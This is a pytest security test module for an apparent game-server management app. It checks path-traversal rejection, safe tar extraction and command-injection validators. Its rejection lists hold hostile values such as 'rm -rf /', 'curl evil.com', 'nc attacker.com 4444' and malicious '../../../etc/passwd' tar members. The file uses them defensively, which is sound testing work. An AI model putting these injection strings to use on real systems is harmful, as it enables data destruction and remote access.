"""Security tests for path traversal and file operation vulnerabilities.

This test module validates that all security fixes prevent path traversal attacks
and other file operation vulnerabilities.
"""

import io
import tarfile
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest
from sqlalchemy.orm import Session

from app.core.security import (
    FileOperationValidator,
    PathValidator,
    SecurityError,
    TarExtractor,
)
from app.servers.models import ServerType
from app.servers.schemas import ServerCreateRequest
from app.servers.service import (
    ServerFileSystemService,
    ServerValidationService,
    ServerSecurityValidator,
)
from app.services.backup_service import BackupFileService


class TestPathValidator:
    """Test path validation utilities."""

    def test_validate_safe_name_valid_names(self):
        """Test that valid names pass validation."""
        valid_names = [
            "test-server",
            "my_server",
            "server123",
            "My-Server_123",
            "simple",
            "My Server",  # Spaces are now allowed
            "Server with spaces",
        ]

        for name in valid_names:
            result = PathValidator.validate_safe_name(name)
            assert result == name

    def test_validate_safe_name_invalid_characters(self):
        """Test that names with invalid characters are rejected."""
        invalid_names = [
            "../../../etc/passwd",
            "server/with/slashes",
            "server\\with\\backslashes",
            "server@domain",
            "server#hash",
            "server$dollar",
            "server%percent",
            "server&ampersand",
            "server*asterisk",
            "server(paren)",
            "server[bracket]",
            "server{brace}",
            "server|pipe",
            "server;semicolon",
            "server:colon",
            "server'quote",
            'server"doublequote',
            "server<less>",
            "server?question",
            "server+plus",
            "server=equal",
        ]

        for name in invalid_names:
            with pytest.raises(SecurityError, match="invalid characters"):
                PathValidator.validate_safe_name(name)

    def test_validate_safe_name_path_traversal(self):
        """Test that path traversal patterns are rejected."""
        traversal_names = [
            "..",
            "../etc",
            "normal/../etc",
            "server..etc",
            "..server",
            "server..",
        ]

        for name in traversal_names:
            with pytest.raises(SecurityError):
                PathValidator.validate_safe_name(name)

    def test_validate_safe_name_reserved_names(self):
        """Test that reserved names are rejected."""
        reserved_names = [
            "CON",
            "PRN",
            "AUX",
            "NUL",
            "COM1",
            "COM2",
            "LPT1",
            "LPT2",
            "con",
            "prn",
            "aux",
            "nul",  # Test case insensitive
        ]

        for name in reserved_names:
            with pytest.raises(SecurityError, match="reserved name"):
                PathValidator.validate_safe_name(name)

    def test_validate_safe_name_length_limit(self):
        """Test that overly long names are rejected."""
        long_name = "a" * 300
        with pytest.raises(SecurityError, match="too long"):
            PathValidator.validate_safe_name(long_name, max_length=255)

    def test_validate_safe_name_empty_or_none(self):
        """Test that empty or None names are rejected."""
        with pytest.raises(SecurityError, match="non-empty string"):
            PathValidator.validate_safe_name("")

        with pytest.raises(SecurityError, match="non-empty string"):
            PathValidator.validate_safe_name(None)

    def test_validate_safe_path_within_base(self):
        """Test that paths within base directory are allowed."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)
            safe_path = base_dir / "subdir" / "file.txt"

            # Create the path to test
            safe_path.parent.mkdir(parents=True, exist_ok=True)
            safe_path.touch()

            result = PathValidator.validate_safe_path(safe_path, base_dir)
            assert result.is_absolute()
            assert str(result).startswith(str(base_dir.resolve()))

    def test_validate_safe_path_traversal_attempt(self):
        """Test that path traversal attempts are blocked."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir) / "servers"
            base_dir.mkdir()

            # Try to traverse outside base directory
            malicious_path = base_dir / ".." / ".." / "etc" / "passwd"

            with pytest.raises(SecurityError, match="Path traversal attempt"):
                PathValidator.validate_safe_path(malicious_path, base_dir)

    def test_create_safe_server_directory(self):
        """Test safe server directory creation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)

            # Test valid server name
            server_dir = PathValidator.create_safe_server_directory(
                "test-server", base_dir
            )
            assert server_dir == base_dir / "test-server"

    def test_create_safe_server_directory_with_sanitization(self):
        """Test that server names are sanitized for directory creation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)

            # Test that problematic names are sanitized
            server_dir = PathValidator.create_safe_server_directory(
                "My Server!", base_dir
            )
            assert server_dir.name == "My_Server"
            assert str(server_dir).startswith(str(base_dir))

    def test_sanitize_directory_name(self):
        """Test directory name sanitization."""
        test_cases = [
            ("My Server", "My_Server"),
            ("Server@Domain", "Server_Domain"),
            ("Server/With/Slashes", "Server_With_Slashes"),
            ("Server\\With\\Backslashes", "Server_With_Backslashes"),
            ("Server-With_Dots.txt", "Server-With_Dots.txt"),
            ("   Server   ", "Server"),
            ("Multiple___Underscores", "Multiple_Underscores"),
            ("", "server"),  # Empty string fallback
            ("Server!@#$%^&*()", "Server"),  # Trailing underscores are stripped
            ("Server!Middle@Characters", "Server_Middle_Characters"),
        ]

        for input_name, expected in test_cases:
            result = PathValidator.sanitize_directory_name(input_name)
            assert result == expected, (
                f"Input: {input_name}, Expected: {expected}, Got: {result}"
            )


class TestTarExtractor:
    """Test secure tar extraction utilities."""

    def create_malicious_tar(self, temp_dir: Path) -> Path:
        """Create a tar file with malicious paths for testing."""
        tar_path = temp_dir / "malicious.tar.gz"

        with tarfile.open(tar_path, "w:gz") as tar:
            # Add a safe file
            safe_info = tarfile.TarInfo("safe_file.txt")
            safe_info.size = 5
            tar.addfile(safe_info, io.BytesIO(b"safe\n"))

            # Add a malicious file with path traversal
            malicious_info = tarfile.TarInfo("../../../etc/passwd")
            malicious_info.size = 7
            tar.addfile(malicious_info, io.BytesIO(b"hacked\n"))

        return tar_path

    def test_validate_tar_member_safe_file(self):
        """Test that safe tar members pass validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            target_dir = Path(temp_dir)

            # Create a safe tar member
            member = tarfile.TarInfo("safe_file.txt")
            member.size = 5

            # Should not raise an exception
            TarExtractor.validate_tar_member(member, target_dir)

    def test_validate_tar_member_path_traversal(self):
        """Test that tar members with path traversal are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            target_dir = Path(temp_dir)

            # Test various path traversal patterns
            malicious_names = [
                "../../../etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\windows\\system32",
                "normal/../../../etc/hosts",
            ]

            for name in malicious_names:
                member = tarfile.TarInfo(name)
                member.size = 5

                with pytest.raises(SecurityError):
                    TarExtractor.validate_tar_member(member, target_dir)

    def test_validate_tar_member_symlinks(self):
        """Test that symbolic links are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            target_dir = Path(temp_dir)

            # Create a symbolic link tar member
            member = tarfile.TarInfo("symlink")
            member.type = tarfile.SYMTYPE
            member.linkname = "/etc/passwd"

            with pytest.raises(SecurityError, match="symbolic"):
                TarExtractor.validate_tar_member(member, target_dir)

    def test_validate_tar_member_device_files(self):
        """Test that device files are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            target_dir = Path(temp_dir)

            # Create a device file tar member
            member = tarfile.TarInfo("device")
            member.type = tarfile.CHRTYPE

            with pytest.raises(SecurityError, match="device file"):
                TarExtractor.validate_tar_member(member, target_dir)

    def test_safe_extract_tar_malicious_archive(self):
        """Test that malicious tar archives are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            target_dir = temp_path / "extract"
            target_dir.mkdir()

            # Create malicious tar
            malicious_tar = self.create_malicious_tar(temp_path)

            # Should raise SecurityError due to path traversal
            with pytest.raises(SecurityError):
                TarExtractor.safe_extract_tar(malicious_tar, target_dir)

    def test_safe_extract_tar_safe_archive(self):
        """Test that safe tar archives extract correctly."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            target_dir = temp_path / "extract"
            target_dir.mkdir()

            # Create safe tar
            safe_tar = temp_path / "safe.tar.gz"
            with tarfile.open(safe_tar, "w:gz") as tar:
                safe_info = tarfile.TarInfo("safe_file.txt")
                safe_info.size = 12
                tar.addfile(safe_info, io.BytesIO(b"safe content"))

            # Should extract without issues
            TarExtractor.safe_extract_tar(safe_tar, target_dir)

            # Verify file was extracted
            extracted_file = target_dir / "safe_file.txt"
            assert extracted_file.exists()
            assert extracted_file.read_text() == "safe content"

    def test_validate_archive_safety_oversized_archive(self):
        """Test that oversized archives are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create a mock large archive by creating a file and checking if validation would catch it
            large_archive = temp_path / "large.tar.gz"

            # Create a file larger than the limit (simulate by patching the size check)
            with patch.object(Path, "stat") as mock_stat:
                mock_stat.return_value.st_size = TarExtractor.MAX_ARCHIVE_SIZE + 1

                with pytest.raises(SecurityError, match="Archive too large"):
                    TarExtractor.validate_archive_safety(large_archive)

    def test_validate_archive_safety_too_many_members(self):
        """Test that archives with too many members are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            many_members_tar = temp_path / "many_members.tar.gz"

            # Create archive with many members (use a smaller number for testing)
            test_limit = 5  # Use smaller limit for testing
            with patch.object(TarExtractor, "MAX_MEMBER_COUNT", test_limit):
                with tarfile.open(many_members_tar, "w:gz") as tar:
                    # Add more members than the limit
                    for i in range(test_limit + 1):
                        member = tarfile.TarInfo(f"file_{i}.txt")
                        member.size = 5
                        tar.addfile(member, io.BytesIO(b"test\n"))

                with pytest.raises(SecurityError, match="Too many files"):
                    TarExtractor.validate_archive_safety(many_members_tar)

    def test_validate_archive_safety_oversized_member(self):
        """Test that archives with oversized individual members are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            large_member_tar = temp_path / "large_member.tar.gz"

            # Create archive with a large member
            test_limit = 1000  # Use smaller limit for testing
            with patch.object(TarExtractor, "MAX_MEMBER_SIZE", test_limit):
                with tarfile.open(large_member_tar, "w:gz") as tar:
                    member = tarfile.TarInfo("large_file.txt")
                    member.size = test_limit + 1
                    tar.addfile(member, io.BytesIO(b"x" * (test_limit + 1)))

                with pytest.raises(SecurityError, match="File too large"):
                    TarExtractor.validate_archive_safety(large_member_tar)

    def test_validate_archive_safety_total_size_too_large(self):
        """Test that archives with total extracted size too large are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            large_total_tar = temp_path / "large_total.tar.gz"

            # Create archive where total extracted size exceeds limit
            test_limit = 2000  # Use smaller limit for testing
            with patch.object(TarExtractor, "MAX_EXTRACTED_SIZE", test_limit):
                with tarfile.open(large_total_tar, "w:gz") as tar:
                    # Add multiple files that together exceed the limit
                    for i in range(3):
                        member = tarfile.TarInfo(f"file_{i}.txt")
                        member.size = 800  # 3 * 800 = 2400 > 2000
                        tar.addfile(member, io.BytesIO(b"x" * 800))

                with pytest.raises(SecurityError, match="Total extracted size too large"):
                    TarExtractor.validate_archive_safety(large_total_tar)


class TestFileOperationValidator:
    """Test file operation validation utilities."""

    def test_validate_server_file_path_safe(self):
        """Test that safe server file paths are allowed."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)
            server_dir = base_dir / "test-server"
            server_dir.mkdir()

            # Test valid file path within server
            result = FileOperationValidator.validate_server_file_path(
                "test-server", "config/server.properties", base_dir
            )

            expected = server_dir / "config" / "server.properties"
            assert result == expected.resolve()

    def test_validate_server_file_path_traversal(self):
        """Test that path traversal in file paths is blocked."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)

            # Test path traversal in file path
            with pytest.raises(SecurityError):
                FileOperationValidator.validate_server_file_path(
                    "test-server", "../../../etc/passwd", base_dir
                )

    def test_validate_server_file_path_invalid_server_name(self):
        """Test that invalid server names are rejected."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)

            # Test invalid server name
            with pytest.raises(SecurityError):
                FileOperationValidator.validate_server_file_path(
                    "../../../etc", "passwd", base_dir
                )


class TestServerServiceSecurity:
    """Test security fixes in server service."""

    def test_server_validation_service_rejects_malicious_names(self):
        """Test that server validation rejects malicious names."""
        validation_service = ServerValidationService()

        malicious_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "../../app/core/database.py",
            "normal/../../../etc/hosts",
        ]

        for name in malicious_names:
            with pytest.raises(InvalidRequestException):
                validation_service.validate_server_directory(name)

    @pytest.mark.asyncio
    async def test_filesystem_service_rejects_malicious_names(self):
        """Test that filesystem service rejects malicious server names."""
        filesystem_service = ServerFileSystemService()

        malicious_names = [
            "../../../tmp/malicious",
            "..\\..\\..\\windows\\temp",
            "normal/../../../tmp/hack",
        ]

        for name in malicious_names:
            with pytest.raises(InvalidRequestException):
                await filesystem_service.create_server_directory(name)

    @pytest.mark.asyncio
    async def test_filesystem_service_allows_safe_names(self):
        """Test that filesystem service allows safe server names."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a custom filesystem service with temp directory
            filesystem_service = ServerFileSystemService()
            filesystem_service.base_directory = Path(temp_dir)

            # Test safe names
            safe_names = ["test-server", "my_server", "server123"]

            for name in safe_names:
                server_dir = await filesystem_service.create_server_directory(name)
                assert server_dir.exists()
                # The directory name may be sanitized (e.g., test-server -> test_server)
                expected_name = PathValidator.sanitize_directory_name(name)
                assert server_dir.name == expected_name
                assert str(server_dir).startswith(str(Path(temp_dir)))


class TestBackupServiceSecurity:
    """Test security fixes in backup service."""

    def test_backup_file_service_secure_extraction(self):
        """Test that backup extraction uses secure methods."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            backups_dir = temp_path / "backups"
            backups_dir.mkdir()

            backup_service = BackupFileService(backups_dir)

            # Create malicious backup file
            malicious_backup = temp_path / "malicious_backup.tar.gz"
            with tarfile.open(malicious_backup, "w:gz") as tar:
                # Add malicious file
                malicious_info = tarfile.TarInfo("../../../etc/passwd")
                malicious_info.size = 7
                tar.addfile(malicious_info, io.BytesIO(b"hacked\n"))

            # Create mock backup and server objects
            mock_backup = Mock()
            mock_backup.file_path = str(malicious_backup)

            mock_server = Mock()
            mock_server.directory_path = str(temp_path / "target")

            # Should raise FileOperationException (which wraps SecurityError) when extracting malicious backup
            with pytest.raises(FileOperationException):
                backup_service._extract_backup_to_directory(
                    malicious_backup, Path(mock_server.directory_path)
                )

    @pytest.mark.asyncio
    async def test_backup_upload_security_validation(self):
        """Test that backup upload validates security correctly."""
        from app.services.backup_service import BackupService
        from app.core.exceptions import FileOperationException
        from unittest.mock import AsyncMock, Mock

        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create BackupService and set custom backup directory for testing
            backup_service = BackupService()
            backup_service.backups_directory = temp_path / "backups"
            backup_service.backups_directory.mkdir()

            # Create malicious backup file content
            malicious_content = io.BytesIO()
            with tarfile.open(fileobj=malicious_content, mode="w:gz") as tar:
                # Add malicious file
                malicious_info = tarfile.TarInfo("../../../etc/passwd")
                malicious_info.size = 7
                tar.addfile(malicious_info, io.BytesIO(b"hacked\n"))

            malicious_bytes = malicious_content.getvalue()

            # Create mock upload file
            mock_upload_file = AsyncMock()
            mock_upload_file.filename = "malicious.tar.gz"
            mock_upload_file.headers = {"content-length": str(len(malicious_bytes))}

            # Mock the chunked reading behavior for streaming
            chunk_size = 8192
            chunks = [
                malicious_bytes[i : i + chunk_size]
                for i in range(0, len(malicious_bytes), chunk_size)
            ]
            chunks.append(b"")  # End of file marker
            mock_upload_file.read = AsyncMock(side_effect=chunks)

            # Create mock database session
            mock_db = Mock()

            # Mock the validation service
            with patch(
                "app.services.backup_service.BackupValidationService.validate_server_for_backup"
            ) as mock_validate:
                mock_server = Mock()
                mock_server.id = 1
                mock_validate.return_value = mock_server

                # Should raise FileOperationException due to security validation failure
                try:
                    result = await backup_service.upload_backup(
                        server_id=1, file=mock_upload_file, db=mock_db
                    )
                    # If we get here, the test failed - security validation should have caught the malicious file
                    pytest.fail(
                        f"Expected security validation to fail, but upload succeeded: {result}"
                    )
                except FileOperationException as e:
                    # This is what we expect - verify it's a security validation failure
                    assert "Security validation failed" in str(e), (
                        f"Expected security validation error, got: {e}"
                    )
                except Exception as e:
                    # Log any other exceptions for debugging
                    pytest.fail(f"Unexpected exception type: {type(e).__name__}: {e}")


class TestIntegrationSecurity:
    """Integration tests for security across services."""

    def test_server_creation_path_traversal_protection(self):
        """Test end-to-end protection against path traversal in server creation."""
        # This test would require setting up a full test database and services
        # For now, we test the core validation logic

        malicious_requests = [
            {"name": "../../../etc/passwd"},
            {"name": "..\\..\\..\\windows\\system32"},
            {"name": "normal/../../../tmp/hack"},
        ]

        validation_service = ServerValidationService()

        for request_data in malicious_requests:
            with pytest.raises(InvalidRequestException):
                validation_service.validate_server_directory(request_data["name"])

    def test_file_operations_path_validation(self):
        """Test that file operations validate paths correctly."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_dir = Path(temp_dir)

            # Test that malicious file paths are rejected
            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config",
                "normal/../../../tmp/hack",
            ]

            for path in malicious_paths:
                with pytest.raises(SecurityError):
                    FileOperationValidator.validate_server_file_path(
                        "test-server", path, base_dir
                    )


class TestCommandInjectionSecurity:
    """Test command injection security fixes."""

    def test_memory_value_validation_valid_values(self):
        """Test that valid memory values pass validation."""
        valid_values = [512, 1024, 2048, 4096, 8192, 16384]

        for value in valid_values:
            # Should not raise exception
            assert ServerSecurityValidator.validate_memory_value(value) is True

    def test_memory_value_validation_invalid_values(self):
        """Test that invalid memory values are rejected."""
        from app.core.exceptions import InvalidRequestException

        invalid_values = [
            -1,  # Negative
            0,  # Zero
            33000,  # Too large
            "512",  # String instead of int
            512.5,  # Float
            None,  # None
        ]

        for value in invalid_values:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_memory_value(value)

    def test_jar_filename_validation_valid_names(self):
        """Test that valid JAR filenames pass validation."""
        valid_names = [
            "server.jar",
            "minecraft-server.jar",
            "paper-1.20.1.jar",
            "spigot_1.19.4.jar",
            "fabric-server-mc.1.20.2.jar",
        ]

        for name in valid_names:
            # Should not raise exception
            assert ServerSecurityValidator.validate_jar_filename(name) is True

    def test_jar_filename_validation_invalid_names(self):
        """Test that invalid JAR filenames are rejected."""
        from app.core.exceptions import InvalidRequestException

        invalid_names = [
            "",  # Empty
            "server.txt",  # Wrong extension
            "server",  # No extension
            "../server.jar",  # Path traversal
            "server/nested.jar",  # Path separator
            "server\\windows.jar",  # Windows path separator
            "server.jar; rm -rf /",  # Command injection
            "server.jar && curl evil.com",  # Command injection
            "$(rm -rf /).jar",  # Command injection
            "`wget evil.com`.jar",  # Command injection
            "a" * 300 + ".jar",  # Too long
        ]

        for name in invalid_names:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_jar_filename(name)

    def test_server_name_validation_valid_names(self):
        """Test that valid server names pass validation."""
        valid_names = [
            "test-server",
            "my_server",
            "Server 123",
            "My-Server_With.Spaces",
            "simple",
            "Test Server Name",
        ]

        for name in valid_names:
            # Should not raise exception
            assert ServerSecurityValidator.validate_server_name(name) is True

    def test_server_name_validation_invalid_names(self):
        """Test that invalid server names are rejected."""
        from app.core.exceptions import InvalidRequestException

        invalid_names = [
            "",  # Empty
            "   ",  # Only spaces
            "server; rm -rf /",  # Command injection
            "server && curl evil.com",  # Command injection
            "server | nc attacker.com 4444",  # Command injection
            "server`wget evil.com`",  # Command injection
            "$(rm -rf /tmp)",  # Command injection
            "server/../../../etc/passwd",  # Path traversal
            "server@domain.com",  # Invalid characters
            "server#hash",  # Invalid characters
            "server$variable",  # Invalid characters
            "server%percent",  # Invalid characters
            "server&ampersand",  # Invalid characters
            "server*glob",  # Invalid characters
            "server(parentheses)",  # Invalid characters
            "server[brackets]",  # Invalid characters
            "server{braces}",  # Invalid characters
            "server|pipe",  # Invalid characters
            "server;semicolon",  # Invalid characters
            "server:colon",  # Invalid characters
            "server'quote",  # Invalid characters
            'server"doublequote',  # Invalid characters
            "server<redirect>",  # Invalid characters
            "server?question",  # Invalid characters
            "server+plus",  # Invalid characters
            "server=equals",  # Invalid characters
            "a" * 150,  # Too long
        ]

        for name in invalid_names:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_server_name(name)

    def test_java_path_validation_valid_paths(self):
        """Test that valid Java paths pass validation."""
        valid_paths = [
            "/usr/bin/java",
            "/opt/java/bin/java",
            "/usr/lib/jvm/java-17-openjdk/bin/java",
            "/home/user/java/bin/java",
        ]

        for path in valid_paths:
            # Should not raise exception
            assert ServerSecurityValidator.validate_java_path(path) is True

    def test_java_path_validation_invalid_paths(self):
        """Test that invalid Java paths are rejected."""
        from app.core.exceptions import InvalidRequestException

        invalid_paths = [
            "",  # Empty
            "java",  # Relative path
            "/usr/bin/java; rm -rf /",  # Command injection
            "/usr/bin/java && curl evil.com",  # Command injection
            "/usr/bin/java | nc attacker.com",  # Command injection
            "/usr/bin/../../../etc/passwd",  # Path traversal
            "/usr/bin/java`wget evil.com`",  # Command injection
            "$(rm -rf /tmp)/java",  # Command injection
            "/usr/bin/java@domain",  # Invalid characters
            "/usr/bin/java#comment",  # Invalid characters
            "/usr/bin/java$variable",  # Invalid characters
            "a" * 600,  # Too long
        ]

        for path in invalid_paths:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_java_path(path)

    def test_shell_sanitization(self):
        """Test shell sanitization function."""
        import shlex

        test_cases = [
            "simple",
            "with spaces",
            "with'quote",
            "with$variable",
            "with;command",
            "with&&command",
            "with|pipe",
            "with`backtick`",
        ]

        for input_val in test_cases:
            result = ServerSecurityValidator.sanitize_for_shell(input_val)
            expected = shlex.quote(input_val)
            assert result == expected, (
                f"Input: {input_val}, Expected: {expected}, Got: {result}"
            )

    @pytest.mark.asyncio
    async def test_startup_script_generation_command_injection_protection(self):
        """Test that startup script generation prevents command injection."""
        from app.servers.service import ServerFileSystemService
        from app.servers.models import Server
        from unittest.mock import Mock
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            server_dir = Path(temp_dir)

            # Create mock server with malicious values
            malicious_server = Mock(spec=Server)
            malicious_server.id = 1
            malicious_server.max_memory = 1024  # Valid value

            filesystem_service = ServerFileSystemService()

            # This should not raise an exception and should create a secure script
            await filesystem_service._generate_startup_script(
                malicious_server, server_dir
            )

            # Verify script was created
            script_file = server_dir / "start.sh"
            assert script_file.exists()

            # Read script content and verify it's safe
            script_content = script_file.read_text()

            # Verify script uses proper variable quoting
            assert "SERVER_DIR=" in script_content
            assert "MAX_MEMORY=" in script_content
            assert "set -e" in script_content  # Exit on error
            assert "set -u" in script_content  # Exit on undefined variable
            assert "exec java" in script_content  # Uses exec for proper process handling

    def test_command_injection_integration_server_creation(self):
        """Test command injection protection in server creation flow."""
        from app.core.exceptions import InvalidRequestException

        # Test malicious server names that should be rejected
        malicious_names = [
            "server; rm -rf /",
            "server && curl evil.com",
            "server | nc attacker.com 4444",
            "server`wget evil.com`",
            "$(rm -rf /tmp)",
        ]

        # All malicious names should fail server name validation
        for name in malicious_names:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_server_name(name)

        # Test malicious memory values should be rejected
        malicious_memory_values = [
            -1,  # Negative
            0,  # Zero
            50000,  # Too large
        ]

        for memory in malicious_memory_values:
            with pytest.raises(InvalidRequestException):
                ServerSecurityValidator.validate_memory_value(memory)

        # This demonstrates defense in depth - multiple validation layers

    def test_security_validator_edge_cases(self):
        """Test edge cases in security validation."""
        from app.core.exceptions import InvalidRequestException

        # Test None values
        with pytest.raises(InvalidRequestException):
            ServerSecurityValidator.validate_server_name(None)

        # Test boundary values for memory
        ServerSecurityValidator.validate_memory_value(1)  # Minimum allowed
        ServerSecurityValidator.validate_memory_value(32768)  # Maximum allowed

        with pytest.raises(InvalidRequestException):
            ServerSecurityValidator.validate_memory_value(0)  # Below minimum

        with pytest.raises(InvalidRequestException):
            ServerSecurityValidator.validate_memory_value(32769)  # Above maximum

    @pytest.mark.asyncio
    async def test_startup_script_security_features(self):
        """Test that generated startup scripts have security features."""
        from app.servers.service import ServerFileSystemService
        from app.servers.models import Server
        from unittest.mock import Mock
        import tempfile
        import stat

        with tempfile.TemporaryDirectory() as temp_dir:
            server_dir = Path(temp_dir)

            # Create valid server mock
            server = Mock(spec=Server)
            server.id = 1
            server.max_memory = 2048

            filesystem_service = ServerFileSystemService()

            # Generate startup script
            await filesystem_service._generate_startup_script(server, server_dir)

            script_file = server_dir / "start.sh"
            script_content = script_file.read_text()

            # Verify security features
            security_checks = [
                "set -e",  # Exit on error
                "set -u",  # Exit on undefined variable
                "SERVER_DIR=",  # Proper variable assignment
                'if [ ! -d "$SERVER_DIR" ]',  # Directory validation
                'if [ ! -f "$SERVER_DIR/$JAR_FILE" ]',  # File validation
                "exec java",  # Proper process execution
            ]

            for check in security_checks:
                assert check in script_content, f"Missing security feature: {check}"

            # Verify file permissions (should be executable)
            file_stat = script_file.stat()
            assert file_stat.st_mode & stat.S_IRUSR  # Owner read
            assert file_stat.st_mode & stat.S_IWUSR  # Owner write
            assert file_stat.st_mode & stat.S_IXUSR  # Owner execute


# Patch imports that might not exist during testing
try:
    from app.core.exceptions import InvalidRequestException, FileOperationException
except ImportError:
    # Create mock exceptions for testing
    class InvalidRequestException(Exception):
        pass

    class FileOperationException(Exception):
        pass
